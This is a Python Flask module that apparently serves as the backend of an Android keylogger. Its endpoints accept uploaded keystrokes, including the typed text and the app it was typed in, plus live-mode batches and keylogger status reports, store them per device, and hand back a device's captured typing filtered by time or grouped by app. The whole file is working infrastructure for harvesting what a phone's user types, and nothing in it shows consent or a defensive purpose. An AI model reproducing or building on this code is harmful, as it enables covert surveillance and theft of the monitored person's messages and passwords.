from flask import Blueprint, request, jsonify, current_app
from datetime import datetime
from sqlalchemy.exc import SQLAlchemyError
from models.devices import Keystroke
from config.database import db

keystrokes_bp = Blueprint('keystrokes', __name__)


@keystrokes_bp.route('/keystrokes', methods=['POST'])
def save_keystrokes():
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        keystrokes_data = data.get('keystrokes', [])

        if not device_id or not keystrokes_data:
            return jsonify({'error': 'Missing device ID or keystrokes data'}), 400

        for keystroke in keystrokes_data:
            new_keystroke = Keystroke(
                device_id=device_id,
                package_name=keystroke.get('package_name'),
                text=keystroke.get('text'),
                event_type=keystroke.get('event_type'),
                timestamp=datetime.fromtimestamp(
                    keystroke.get('timestamp') / 1000.0)
            )
            db.session.add(new_keystroke)

        db.session.commit()
        return jsonify({'message': 'Keystrokes saved successfully'}), 200

    except SQLAlchemyError as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/keystrokes/live', methods=['POST'])
def save_live_keystrokes():
    """
    Endpoint to receive live keystrokes from the Android app
    This saves the data to the database without handling Socket.IO broadcasting
    """
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        keystrokes_data = data.get('keystrokes', [])
        is_live_mode = data.get('live_mode', False)

        if not device_id:
            current_app.logger.error("Missing device ID in live keystroke data")
            return jsonify({'error': 'Missing device ID'}), 400

        if not keystrokes_data:
            current_app.logger.warning(f"Empty keystrokes array for device {device_id}")
            return jsonify({'error': 'Missing keystrokes data'}), 400

        current_app.logger.info(f"Received {len(keystrokes_data)} live keystrokes from device {device_id}, live_mode={is_live_mode}")

        # Save keystrokes to database
        for keystroke in keystrokes_data:
            timestamp_ms = keystroke.get('timestamp', int(datetime.now().timestamp() * 1000))
            try:
                timestamp = datetime.fromtimestamp(timestamp_ms / 1000.0)
            except Exception as e:
                current_app.logger.error(f"Invalid timestamp {timestamp_ms}: {str(e)}")
                timestamp = datetime.now()
                
            new_keystroke = Keystroke(
                device_id=device_id,
                package_name=keystroke.get('package_name'),
                text=keystroke.get('text'),
                event_type=keystroke.get('event_type'),
                timestamp=timestamp
            )
            db.session.add(new_keystroke)

        db.session.commit()
        current_app.logger.debug(f"Saved {len(keystrokes_data)} keystrokes to database for device {device_id}")

        return jsonify({
            'message': 'Live keystrokes saved successfully',
            'keystrokes_saved': len(keystrokes_data),
            'live_mode': is_live_mode
        }), 200

    except SQLAlchemyError as e:
        db.session.rollback()
        current_app.logger.error(f"Database error in save_live_keystrokes: {str(e)}")
        return jsonify({'error': f"Database error: {str(e)}"}), 500
    except Exception as e:
        current_app.logger.error(f"Unexpected error in save_live_keystrokes: {str(e)}")
        return jsonify({'error': f"Unexpected error: {str(e)}"}), 500


@keystrokes_bp.route('/keylogger-status', methods=['POST'])
def update_keylogger_status():
    """
    Endpoint to receive keylogger status updates from the Android app
    """
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        status = data.get('status')  # 'enabled' or 'disabled'
        timestamp = data.get('timestamp', int(datetime.now().timestamp() * 1000))

        if not device_id or not status:
            return jsonify({'error': 'Missing device ID or status'}), 400

        # We're just storing the status info, not emitting Socket.IO events
        # Any Socket.IO events should be handled by the user app
        return jsonify({'message': f'Keylogger status updated to: {status}'}), 200

    except Exception as e:
        current_app.logger.error(f"Error in update_keylogger_status: {str(e)}")
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/local-keystrokes', methods=['POST'])
def save_local_keystrokes():
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        keystrokes_data = data.get('keystrokes', [])

        if not device_id or not keystrokes_data:
            return jsonify({'error': 'Missing device ID or keystrokes data'}), 400

        # Delete existing keystrokes for this device to avoid duplicates
        Keystroke.query.filter_by(device_id=device_id).delete()

        for keystroke in keystrokes_data:
            new_keystroke = Keystroke(
                device_id=device_id,
                package_name=keystroke.get('package_name'),
                text=keystroke.get('text'),
                event_type=keystroke.get('event_type'),
                timestamp=datetime.fromtimestamp(
                    keystroke.get('timestamp') / 1000.0)
            )
            db.session.add(new_keystroke)

        db.session.commit()
        return jsonify({'message': 'Local keystrokes saved successfully'}), 200

    except SQLAlchemyError as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/device/<device_id>/keystrokes', methods=['GET'])
def get_device_keystrokes(device_id):
    try:
        # Check if 'since' parameter is provided to filter by timestamp
        since_timestamp = request.args.get('since')
        
        # Build the base query
        query = Keystroke.query.filter_by(device_id=device_id)
        
        # If 'since' parameter is provided, add timestamp filter
        if since_timestamp:
            try:
                # Convert to integer timestamp in milliseconds
                since_timestamp = int(since_timestamp)
                # Convert to datetime (timestamp is stored in seconds in the database)
                since_datetime = datetime.fromtimestamp(since_timestamp / 1000.0)
                # Add filter for timestamps after the given datetime
                query = query.filter(Keystroke.timestamp > since_datetime)
                current_app.logger.debug(f"Filtering keystrokes after: {since_datetime}")
            except (ValueError, TypeError) as e:
                current_app.logger.error(f"Invalid 'since' parameter: {since_timestamp}, error: {str(e)}")
                # If timestamp is invalid, continue without filtering
        
        # Get keystrokes ordered by timestamp
        keystrokes = query.order_by(Keystroke.timestamp.desc()).all()
        current_app.logger.info(f"Returning {len(keystrokes)} keystrokes for device {device_id}")
        
        return jsonify([keystroke.to_dict() for keystroke in keystrokes]), 200

    except SQLAlchemyError as e:
        current_app.logger.error(f"Database error in get_device_keystrokes: {str(e)}")
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/device/<device_id>/keystrokes/apps', methods=['GET'])
def get_device_keystrokes_by_app(device_id):
    try:
        keystrokes = Keystroke.query.filter_by(device_id=device_id)\
            .order_by(Keystroke.package_name, Keystroke.timestamp.desc()).all()

        apps_data = {}
        for keystroke in keystrokes:
            if keystroke.package_name not in apps_data:
                apps_data[keystroke.package_name] = []
            apps_data[keystroke.package_name].append(keystroke.to_dict())

        return jsonify(apps_data), 200

    except SQLAlchemyError as e:
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/device/<device_id>/keylogger/status', methods=['GET'])
def get_keylogger_status(device_id):
    """
    Get the current status of the keylogger for a device
    This is a simple endpoint that can be used to check if the keylogger is enabled
    """
    try:
        # In a real implementation, you might store the keylogger status in the database
        # For now, just return a default status
        return jsonify({
            'device_id': device_id,
            'live_mode': False,  # Default status
            'timestamp': datetime.now().timestamp() * 1000
        }), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500
